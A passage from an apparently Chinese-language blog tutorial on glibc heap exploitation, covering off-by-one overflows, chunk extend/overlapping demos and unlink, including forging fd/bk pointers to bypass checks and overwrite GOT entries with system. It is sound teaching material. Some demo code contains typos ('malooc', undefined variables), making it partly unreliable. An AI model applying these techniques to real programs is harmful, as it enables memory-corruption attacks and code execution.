class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，我们自己写的 my_gets 函数实际输入 size+1 位数据，造成了 off-by-one 溢出。</p><p>我们使用 gdb 对程序进行调试，查看在进行输入分配的堆块为两个十六字节的堆块：</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png"></p><p>连续输入17个1，会发现覆盖到了下一个 chunk 的 <em>prev_size</em> 字节。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png"></p><p>栗子2：</p><p>导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序乍一看没有任何问题，但是我们需要注意到的是，strlen 的长度计算方法和 strcpy 复制时的长度是不一样的。strlen 计算ASCII 字符串的长度，它在计算长度时是不会把字符串结尾的 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串的时候会拷贝字符串的结束符 ‘\x00’ 。这就导致我们实际上是向chunk1 中写入了25字节。</p><p>在strcpy命令执行之前我们的堆结构如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>执行后就会发现它覆盖了下一个堆块的低字节（小端序）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>（为什么没有截图，因为这玩意我都复现不成功😅）</p><blockquote><p>这个漏洞在2.29之后就不能利用了，因为glibc更新以后增加了检查的代码。</p></blockquote><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>这种攻击目的在于将一个chunk块的可控区域衍生到与其相邻的一个或者多个chunk块中。通过这种攻击方式，我们可以修改到不属于本chunk块的内容。通过 extend 可以实现 chunk overlapping 的效果。</p><p>一般来说这种技术并不能直接控制程序的执行流程，但是可以控制chunk 中的内容。如果chunk 中存在字符串指针、函数指针等，就可以利用这些指针来进一步进行信息泄露和程序执行流程。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><ul><li><p>获取当前 chunk 块大小的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 仅用户空间部分的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS 在这里是一个代表堆块大小的标志位掩码</span><br><br><span class="hljs-comment">/* 完整堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure></li><li><p>获取下一个 chunk 块地址的操作，即使用当前块指针加上当前块大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>获取前一个 chunk 块信息的操作，其中堆块地址的计算是由当前 chunk 地址减去前一个 chunk 的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 前一个堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* 前一个堆块的地址  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>判断当前堆块是否被使用，即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li></ul><p>通过上面的几个宏我们可以看出， ptmalloc 通过 chunk header 的数据来判断 chunk 的使用情况和对 chunk 前后进行定位。</p><p>而我们的 chunk extend 就是通过控制 chunk header 即 size 和 pre_size 域来实现跨越块操作导致 overlapping。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h5 id="🌰1：对-inuse-的-fastbin-进行-extend"><a href="#🌰1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="🌰1：对 inuse 的 fastbin 进行 extend"></a>🌰1：对 inuse 的 fastbin 进行 extend</h5><p>就是通过更改第一个堆块的信息来控制它之后的堆块的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// 修改第一个块的size域</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>两次 malloc 后堆块中的数据是这样的</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png"></p><p>修改了 ptr1 的 size 位后对应变成了 41</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png"></p><p>我们 free 掉它之后， 也对应进入了 0x40 的 bin 中</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png"></p><p>此时我们再次分配 0x30 的堆块就会把原本属于 ptr2 头部的内存分配到 ptr3 中，</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png"></p><p>此时原本 chunk2 的头部是现在 ptr3 的用户内容，我们可以直接控制其内容，这种状态就叫做 overlapping chunk。</p><h5 id="🌰2：对-inuse-的-unsortedbin-进行-extend"><a href="#🌰2：对-inuse-的-unsortedbin-进行-extend" class="headerlink" title="🌰2：对 inuse 的 unsortedbin 进行 extend"></a>🌰2：对 inuse 的 unsortedbin 进行 extend</h5><p>我们知道处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。</p><p>接下来我们就使用 0x80 来分配堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p></blockquote><p>三次 malloc 分配完以后，内存中的数据如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb1.png"></p><p>修改size 数据后ptr1 和 ptr2 合并，如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb2.png"></p><p>相应的 free 后进入了 unsorted bin</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb3.png"></p><p>再次分配我们就达到了overlapping chunk的目的。</p><h5 id="🌰3：对-free-的-unsortedbin-进行-extend"><a href="#🌰3：对-free-的-unsortedbin-进行-extend" class="headerlink" title="🌰3：对 free 的 unsortedbin 进行 extend"></a>🌰3：对 free 的 unsortedbin 进行 extend</h5><blockquote><p>在例二的基础上进行，先释放 chunk ，再修改</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三次 malloc 之后的结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png"></p><p>释放 ptr1 后，chunk 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png"></p><p>修改 size 字段</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png"></p><p>再次分配，ptr2 头部被分配进新的堆块，我们就这样控制了 ptr2 的内容</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png"></p><h5 id="🌰4：通过-extend-向后-overlapping"><a href="#🌰4：通过-extend-向后-overlapping" class="headerlink" title="🌰4：通过 extend 向后 overlapping"></a>🌰4：通过 extend 向后 overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><p>就像上面的例子，我们在两次free后可以发现bin 中出现了overlapping。</p><p>第一轮的 malloc 结束</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png"></p><p>修改 ptr1 的 size</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png"></p><p>两次 free，bin 中出现了overlapping。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png"></p><p>而接下来的两次 malloc ，“ 两块 ” chunk 也被一次分配了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png"></p><h5 id="🌰5：通过-extend-向前-overlapping"><a href="#🌰5：通过-extend-向前-overlapping" class="headerlink" title="🌰5：通过 extend 向前 overlapping"></a>🌰5：通过 extend 向前 overlapping</h5><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlink进行前向extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  <span class="hljs-comment">//占位块</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>第一次free后的堆结构如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png"></p><p>对数据进行修改后 <code>free(ptr4)</code> 可以发现 chunk 被合并了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png"></p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink 机制的存在是为了防止内存过度碎片化。当一个 chunk 被释放时，该 chunk 非 fastbin 或 tcache bin ，libc 就会检查该堆块前后是否有 chunk 属于被释放的状态，如果存在，就会将他们从 bin 中取出进行合并，即使这些前后的堆块是在 fast bin 或者 tcache bin 中。</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>unlink 的过程就类似于把双向链表中间的空闲 chunk 取出来，具体流程如下：</p><p>最初 bin 中的堆块像最上图那样链接，P 是我们释放的堆块， BK 是 P 对应链表前方的堆块， FD 是后面的堆块。unlink 结束后就变成了最下图，此时p 在 FD 的 data 中，然后 BK 和 FD 直接相连。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png"></p><p>我们先从已经被淘汰的防护时的 unlink 开始学习其原理</p><h5 id="被淘汰的-unlink"><a href="#被淘汰的-unlink" class="headerlink" title="被淘汰的 unlink"></a>被淘汰的 unlink</h5><p>我们假设堆内的结构如以下左图，现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png"></p><p>那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时，会依次进行下面的操作：</p><ul><li>glibc 判断这个块属于 small chunk</li><li>判断是否需要向前合并，发现前一个 chunk 处于使用状态，不需要向前合并</li><li>判断是否需要向后合并，后一个 chunk 空闲，需要合并</li><li>进行 unlink 操作</li></ul><p> unlink 具体执行的效果如下：</p><ul><li><p><code>FD = P-&gt;fd = target addr - 12</code>  ，即将 <em>FD</em> 字段赋值为堆块 P 的 <em>fd</em> 字段所存储的数据 target addr - 12 </p></li><li><p><code>BK = P-&gt;bk = expect value</code> ，即将 <em>BK</em> 字段赋值为堆块 P 的 <em>bk</em> 字段所存储的数据 expect value （我们预期改写的数据）。</p></li><li><p><code>FD-&gt;bk = BK</code> ，即将 <em>target addr - 12 + 12</em> 处的内容（ target addr 本身）设置为 expect value。</p></li><li><p><code>BK-&gt;fd = FD</code>，即将 <em>expect value + 8</em> 处的内容设置为 target addr - 12。</p></li></ul><p>在这里我们需要确保 expect value + 8 处的地址具有可写的权限，否则可能无法成功利用该漏洞。</p><p>成功执行 unlink 漏洞利用后，会将目标地址处的值设置为我们预期的内容，从而实现任意地址写操作。</p><p>我们可以利用这个漏洞来将某个 GOT 表项指向系统函数或者我们想要调用的函数，从而劫持程序执行流程。但是需要注意的是，expect value + 8 处的值也会被破坏，可能会影响程序的正常执行，因此在利用漏洞时需要仔细考虑和处理这些影响。</p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p>哈哈哈，怎么会这么简单呢🤪</p><p>现在的 unlink 实现之前会对 chunk 的 size 和双向链表进行检查 ，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 检查 P 的大小是否与其相邻堆块的 prev_size 字段一致（size检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查 P 的 fd 和 bk 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// 在 largebin 中，检查 P 的 next_size 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中就有对 fd 和 bk 的检查。而上面的情况中，就会被检查出来，我们无法使用这种方法。</p><p>但是我们可以伪造堆块来绕过检查😎，我们有一个公式：</p><ol><li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li><li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li></ol><p>简单点说就是：</p><ol><li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li><li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li></ol><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png"></p><p>触发unlink后P处的指针会变为 P-0x18 。</p><p>如果将上面说的P变为我们想要修改的地址比如保存指针的数组地址，利用上面说到的 unlink 就能控制数组中的指针，并且我们使指针保存类似 free_got、puts_got 等，之后我们修改指针使其为 system_got ，那么下次我们调用其他函数就会调用 system（）。</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free 就是内存块被释放以后再次被利用，有以下几种情况：</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL，再次利用时程序就会崩溃</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，而且然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现问题。</li></ul><p>我们一般所指的 Use After Free 